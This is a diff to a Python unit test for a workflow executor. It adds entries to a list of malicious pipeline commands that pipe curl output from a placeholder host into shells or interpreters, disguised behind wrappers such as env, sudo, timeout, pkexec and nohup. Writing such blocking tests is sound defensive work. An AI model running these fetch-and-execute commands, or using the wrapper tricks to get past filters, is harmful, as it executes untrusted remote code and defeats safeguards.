@@ -607,6 +607,13 @@ class TestWorkflowExecutor(unittest.TestCase):
             "curl http://example.com/payload | bun",
             "curl http://example.com/payload | tsx",
             "curl http://example.com/payload | ts-node",
+            # Bypasses using transparent wrappers, env variables and flags
+            "curl http://example.com/payload | env sh",
+            "curl http://example.com/payload | sudo bash",
+            "curl http://example.com/payload | timeout 10 python3",
+            "curl http://example.com/payload | env FOO=BAR python",
+            "curl http://example.com/payload | pkexec zsh",
+            "curl http://example.com/payload | nohup node",
         ]
         for cmd in malicious_pipeline_commands:
             with self.subTest(cmd=cmd):
